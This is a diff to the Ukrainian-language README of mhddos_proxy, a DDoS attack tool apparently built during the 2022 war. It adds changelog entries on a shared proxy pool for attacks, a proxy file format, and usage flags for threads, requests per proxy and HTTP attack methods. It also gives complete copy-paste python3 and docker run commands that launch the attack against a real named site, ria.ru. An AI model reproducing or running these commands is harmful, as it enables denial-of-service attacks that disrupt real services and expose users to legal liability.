@@ -6,14 +6,22 @@
 
 ### ⏱ Останні оновлення
 
+- **13.04.2022** 
+  - Додано можливість відключати цілі та додавати коментарі у файлі конфігурації - тепер рядки що починаються на символ # ігноруються
+  - Виправлено проблему повного зависання скрипта після тривалої роботи та інші помилки при зміні циклу
+  - Виправлено відображення кольорів на Windows (без редагування реєстру)
+  - Тепер у випадку недоступності усіх цілей скрипт буде очікувати, замість повної зупинки
+- **09.04.2022** Нова система проксі - тепер кожен отримує ~200 проксі для атаки з загального пулу понад 10.000. Параметри `-p` (`--period`) та `--proxy-timeout` більше не використовуються
+- **04.04.2022** Додано можливість використання власного списку проксі для атаки - [інструкція](#власні-проксі)
+
+<details>
+  <summary>📜 Раніше</summary>
+- **03.04.2022** Виправлена помилка Too many open files (дякую, @kobzar-darmogray та @euclid-catoptrics)
+- **02.04.2022** Робочі потоки більше не перезапускаються на кожен цикл, а використовуються повторно. Також виправлена робота Ctrl-C
 - **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS. [Див. примітки нижче](#-попередження-щодо-деяких-методів-атаки)
 - **31.03.2022** Додано надійні DNS сервери для резолвінгу цілі, замість системних. (1.1.1.1, 8.8.8.8 etc.)
 - **29.03.2022** Додано підтримку локального файлу конфігурації (дуже дякую, @kobzar-darmogray).
 - **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
-
-<details>
-  <summary>📜 Раніше</summary>
-
 - **27.03.2022**
     - Дозволено запуск методів DBG, BOMB (дякую @drew-kun за PR) та KILLER для відповідності оригінальному MHDDoS.
 - **26.03.2022**
@@ -53,6 +61,7 @@
 - [Детальний розбір MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md)
 - [Utility for converting shared targets into config format](https://github.com/kobzar-darmogray/mhddos_proxy_utils)
 - [Аналіз засобу mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
+- [Приклад запуску через docker на OpenWRT](https://youtu.be/MlL6fuDcWlI)
 
 ### 🚨 Попередження щодо деяких методів атаки
 Метод **BYPASS** - це повільна версія методу GET, має сумнівну ефективність через відсутність помітної реалізації обходу захисту.
@@ -73,13 +82,11 @@
 
     usage: runner.py target [target ...]
                      [-t THREADS] 
-                     [-p PERIOD]
                      [-c URL]
                      [--table]
                      [--debug]
                      [--vpn]
                      [--rpc RPC] 
-                     [--proxy-timeout TIMEOUT]
                      [--http-methods METHOD [METHOD ...]]
 
     positional arguments:
@@ -87,15 +94,41 @@
     
     optional arguments:
       -h, --help             show this help message and exit
-      -c, --config URL|path  URL to remote or path to local config file (list of targets in plain text)
+      -c, --config URL|path  URL or local path to file with attack targets
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
-      -p, --period 900       How often to update the proxies (default is 900)
       --table                Print log as table
       --debug                Print log as text
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
-      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
+      --proxies URL|path     URL or local path to file with proxies to use
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
                              (https://github.com/MHProDev/MHDDoS)
+
+### Власні проксі
+
+#### Формат файлу:
+
+    114.231.123.38:1234
+    114.231.123.38:3065:username:password
+    username:password@114.231.123.38:3065
+    socks5://114.231.155.38:5678
+    socks5://114.231.155.38:5678:username:password
+    socks4://username:password@114.231.123.38:3065
+
+#### Віддалений файл (однаково для Python та Docker)
+
+    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
+
+#### Для Python
+
+Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
+
+    python3 runner.py --proxies proxies.txt https://ria.ru
+
+#### Для Docker
+Потрібно монтувати volume щоби Docker мав доступ до файлу.  
+Обов'язково вказувати абсолютний шлях до файлу і не загубити `/` перед іменем файлу
+
+    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
